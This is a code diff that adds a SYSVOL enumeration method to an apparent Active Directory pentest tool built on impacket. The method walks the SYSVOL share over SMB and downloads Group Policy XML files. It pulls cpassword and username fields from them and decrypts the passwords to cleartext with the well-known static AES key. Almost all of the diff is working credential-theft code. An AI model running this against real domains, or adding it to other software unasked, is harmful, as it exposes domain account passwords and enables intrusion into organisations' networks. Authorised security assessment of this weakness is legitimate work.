@@ -2,9 +2,15 @@
 
 import json
 import ldap3
+import re
+import base64
+import os
 from ldap3.core.exceptions import LDAPBindError
 from impacket.dcerpc.v5 import epm
+from impacket.smbconnection import SessionError
+from impacket.nmb import NetBIOSError
 from termcolor import colored
+from Cryptodome.Cipher import AES
 
 from . .connectors.connectors import Connectors
 
@@ -127,3 +133,60 @@ class ModEnumerator():
             print('[ ' + colored('WARN', 'yellow') + f' ] Anonymous/NULL RPC connection allowed got following bytes: {resp.getData()} from the connection')
         else:
             print('[ ' + colored('INFO', 'green') +' ] Anonymous/NULL RPC connection not allowed')
+
+
+    def enumSYSVOL(self, server: str, connector: Connectors, domuser: str, passwd: str) -> dict:
+        print('[ .. ] Searching SYSVOL for cpasswords\r')
+        cpasswords = {}
+        try:
+            smbconn = connector.smb_connector(server, domuser, passwd)
+            dirs = smbconn.listShares()
+            for share in dirs:
+                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
+                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
+                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
+                    for dirname in paths:
+                        try:
+                            # Dont want . or ..
+                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
+                            for sub in subPath:
+                                if len(sub.get_shortname()) > 2:
+                                    paths.append(dirname + '\\' + sub.get_shortname())
+                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
+                            continue
+                
+                    # Compile regexes for username and passwords
+                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
+                    unameRE = re.compile(r'userName|runAs=\"([ a-zA-Z0-9/\(\)-]+)\"')
+
+                    # Prepare the ciphers based on MSDN article with key and IV
+                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, bytes.fromhex('00' * 16))
+                
+                    # Since the first entry is the DC we dont want that
+                    for item in paths[1:]:
+                        if '.xml' in item.split('\\')[-1]:
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
+                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
+                                try:
+                                    fileContent = f.read()
+                                    passwdMatch = cpassRE.findall(str(fileContent))
+                                    for passwd in passwdMatch:
+                                        unameMatch = unameRE.findall(str(fileContent))
+                                        for usr in unameMatch:
+                                            padding = '=' * (4 - len(passwd) % 4) 
+                                            # For some reason, trailing nul bytes were on each character, so we remove any if they are there
+                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8').replace('\x00', '')
+                                except (UnicodeDecodeError, AttributeError) as e:
+                                    # Remove the files we had to write during the search
+                                    os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
+                                    continue
+
+                            # Remove the files we had to write during the search
+                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
+
+        except (SessionError, UnicodeEncodeError, NetBIOSError):
+            print('[ ' + colored('ERROR', 'red') + ' ] Some error occoured while searching SYSVOL')
+        else:
+            smbconn.close()
+            return cpasswords
